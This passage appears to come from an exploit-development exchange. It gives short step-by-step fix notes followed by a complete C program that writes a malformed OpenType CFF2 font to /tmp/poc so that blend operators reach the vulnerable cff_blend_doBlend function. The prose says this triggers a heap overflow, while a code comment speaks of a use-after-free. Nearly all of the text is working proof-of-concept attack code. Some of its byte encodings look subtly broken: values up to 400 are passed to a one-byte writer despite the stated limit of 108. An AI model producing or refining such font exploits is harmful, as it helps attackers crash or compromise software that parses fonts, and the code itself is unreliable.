3. **Write the operands directly without patching**: Use `write_cff_byte_int` (adds 139) for both size and offset when they are <108. For size, ensure `private_len < 108`. Keep the Private DICT small.
4. **Fix the blend operands**: For `numBlends=1` with `num_axes=1`, the stack must contain exactly 2 values (current value and delta) followed by the count `1`. So before the blend operator, write two operands (e.g., 100 and 200) then the count 1, then op 0x17.

Additionally, ensure the `vsindex` operator (0x16) precedes the blend operator, with one operand (vsindex value, e.g., 0).

With these changes, the Private DICT will be parsed, the blend operator encountered, and the vulnerable `cff_blend_doBlend` function called, triggering the heap overflow.

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_cff_byte_int(FILE *f, uint8_t v) {
    fputc(v + 139, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header */
    write_uint32(f, 0x4F54544F);
    write_uint16(f, 1);
    write_uint16(f, 16);
    write_uint16(f, 0);
    write_uint16(f, 0);

    /* Table record for 'CFF2' */
    write_uint32(f, 0x43464632);
    long table_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint32(f, 0);
    long table_start = ftell(f);

    /* CFF2 Header */
    fputc(0x02, f);
    fputc(0x00, f);
    fputc(0x05, f);
    long top_dict_len_pos = ftell(f);
    write_uint16(f, 0);

    /* ---- Top DICT ---- */
    long top_dict_start = ftell(f);

    /* FDArray operator */
    long fdarray_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x24, f);

    /* FDSelect operator */
    long fdselect_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x25, f);

    /* CharStrings operator */
    long charstrings_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x11, f);

    /* VariationStore operator */
    long vstore_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x18, f);

    long top_dict_end = ftell(f);
    uint16_t top_dict_len = top_dict_end - top_dict_start;
    fseek(f, top_dict_len_pos, SEEK_SET);
    write_uint16(f, top_dict_len);
    fseek(f, top_dict_end, SEEK_SET);

    /* ---- Private DICT (placed early to keep offset small) ---- */
    long private_start = ftell(f);
    /* vsindex = 0 */
    write_cff_byte_int(f, 0);
    fputc(0x16, f);
    /* First blend: push 2 values (base + delta) then numBlends=1 */
    write_cff_byte_int(f, 100);
    write_cff_byte_int(f, 200);
    write_cff_byte_int(f, 1);
    fputc(0x17, f);
    /* Second blend: push 2 values then numBlends=1 */
    write_cff_byte_int(f, 300);
    write_cff_byte_int(f, 400);
    write_cff_byte_int(f, 1);
    fputc(0x17, f);
    /* Push integer after blend to trigger use-after-free */
    write_cff_byte_int(f, 0);
    long private_end = ftell(f);
    uint32_t private_len = private_end - private_start;
    uint32_t private_offset = private_start - table_start;

    /* ---- FDArray INDEX ---- */
    long fdarray_start = ftell(f);
    uint32_t fdarray_offset = fdarray_start - table_start;
    fseek(f, fdarray_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdarray_offset >> 8) & 0xFF, f);
    fputc(fdarray_offset & 0xFF, f);
    fseek(f, fdarray_start, SEEK_SET);

    write_uint32(f, 1);
    fputc(0x02, f);
    write_uint16(f, 1);
    long offset1_pos = ftell(f);
    write_uint16(f, 0);

    /* Font DICT */
    long font_dict_start = ftell(f);
    /* Private DICT size and offset (both small, <108) */
    fputc(private_len + 139, f);
    fputc(private_offset + 139, f);
    fputc(0x12, f);
    long font_dict_end = ftell(f);
    uint32_t font_dict_len = font_dict_end - font_dict_start;

    fseek(f, offset1_pos, SEEK_SET);
    write_uint16(f, 1 + font_dict_len);
    fseek(f, font_dict_end, SEEK_SET);

    /* ---- FDSelect ---- */
    long fdselect_start = ftell(f);
    uint32_t fdselect_offset = fdselect_start - table_start;
    fseek(f, fdselect_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdselect_offset >> 8) & 0xFF, f);
    fputc(fdselect_offset & 0xFF, f);
    fseek(f, fdselect_start, SEEK_SET);
    write_uint16(f, 1);
    fputc(0x00, f);

    /* ---- CharStrings INDEX ---- */
    long charstrings_start = ftell(f);
    uint32_t charstrings_offset = charstrings_start - table_start;
    fseek(f, charstrings_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((charstrings_offset >> 8) & 0xFF, f);
    fputc(charstrings_offset & 0xFF, f);
    fseek(f, charstrings_start, SEEK_SET);

    write_uint32(f, 1);
    fputc(0x02, f);
    write_uint16(f, 1);
    write_uint16(f, 2);
    fputc(0x0E, f);

    /* ---- Global Subr INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- VariationStore ---- */
    long vstore_start = ftell(f);
    uint32_t vstore_offset = vstore_start - table_start;
    fseek(f, vstore_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((vstore_offset >> 8) & 0xFF, f);
    fputc(vstore_offset & 0xFF, f);
    fseek(f, vstore_start, SEEK_SET);

    write_uint16(f, 1);
    long vrl_offset_pos = ftell(f);
    write_uint16(f, 0);
    write_uint16(f, 1);
    long ivd_offset_pos = ftell(f);
    write_uint16(f, 0);

    long vrl_start = ftell(f);
    uint32_t vrl_offset_val = vrl_start - vstore_start;
    fseek(f, vrl_offset_pos, SEEK_SET);
    write_uint16(f, vrl_offset_val);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 0);
    write_uint16(f, 16384);
    write_uint16(f, 16384);

    long ivd_start = ftell(f);
    uint32_t ivd_offset_val = ivd_start - vstore_start;
    fseek(f, ivd_offset_pos, SEEK_SET);
    write_uint16(f, ivd_offset_val);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 1);
    write_uint16(f, 0);
    fputc(0, f);

    long table_end = ftell(f);
    uint32_t table_length = table_end - table_start;

    fseek(f, table_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)table_start);
    write_uint32(f, table_length);

    fclose(f);
    return 0;
}
